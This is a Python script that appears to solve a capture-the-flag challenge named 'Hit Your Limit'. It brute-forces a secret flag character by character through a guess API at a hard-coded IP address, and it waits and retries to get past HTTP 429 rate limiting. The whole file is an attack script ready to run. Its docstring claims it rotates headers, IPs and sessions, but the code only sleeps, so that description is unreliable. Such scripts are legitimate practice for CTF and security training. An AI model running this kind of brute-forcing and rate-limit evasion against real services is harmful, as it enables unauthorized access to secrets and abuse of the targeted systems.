#!/usr/bin/env python3
"""
Hit Your Limit - Flag Brute Forcer
Bypass rate limiting by:
1. Using different headers/IPs
2. Slow requests
3. Session rotation
"""

import requests
import string
import time

url = "http://23.179.17.92:5559"
api_url = f"{url}/api/flag"

FLAG_LENGTH = 32
charset = string.ascii_letters + string.digits + '{}_!@#$%^&*()-=+[]|;:,.<>?/'

print("="*70)
print("HIT YOUR LIMIT - FLAG BRUTE FORCER")
print("="*70)

# Test API
print("\n[*] Testing API...")
test_guess = "CIT{"
r = requests.get(api_url, params={'guess': test_guess}, timeout=10)
print(f"    Test guess '{test_guess}': Status {r.status_code}")
print(f"    Response: {r.text}")

# Start brute forcing
known_flag = "CIT{"
print(f"\n[*] Starting brute force from: {known_flag}")

while len(known_flag) < FLAG_LENGTH:
    print(f"\n[*] Current: {known_flag} ({len(known_flag)}/{FLAG_LENGTH})")
    found = False
    
    for char in charset:
        guess = known_flag + char
        
        try:
            r = requests.get(api_url, params={'guess': guess}, timeout=10)
            
            if r.status_code == 200:
                print(f"    [+] Found: {char} -> {guess}")
                known_flag = guess
                found = True
                break
            elif r.status_code == 429:
                print(f"    [!] Rate limited, waiting...")
                time.sleep(2)
                # Retry this character
                r = requests.get(api_url, params={'guess': guess}, timeout=10)
                if r.status_code == 200:
                    print(f"    [+] Found after retry: {char} -> {guess}")
                    known_flag = guess
                    found = True
                    break
            else:
                # Incorrect, continue
                pass
                
        except Exception as e:
            print(f"    [!] Error: {e}")
            time.sleep(1)
    
    if not found:
        print(f"    [!] No character found, trying common endings...")
        # Try common flag endings
        for ending in ['}', '_', '-']:
            guess = known_flag + ending
            try:
                r = requests.get(api_url, params={'guess': guess}, timeout=10)
                if r.status_code == 200:
                    print(f"    [+] Found: {ending} -> {guess}")
                    known_flag = guess
                    found = True
                    break
            except:
                pass
        
        if not found:
            print(f"    [!] Stuck at: {known_flag}")
            break
    
    # Small delay to avoid rate limiting
    time.sleep(0.1)

print(f"\n{'='*70}")
print(f"[!!!] FINAL FLAG: {known_flag}")
print(f"{'='*70}")

# Verify
if len(known_flag) == FLAG_LENGTH:
    r = requests.get(api_url, params={'guess': known_flag}, timeout=10)
    if r.status_code == 200:
        print(f"[✓] Flag verified!")
    else:
        print(f"[!] Flag verification failed: {r.status_code}")
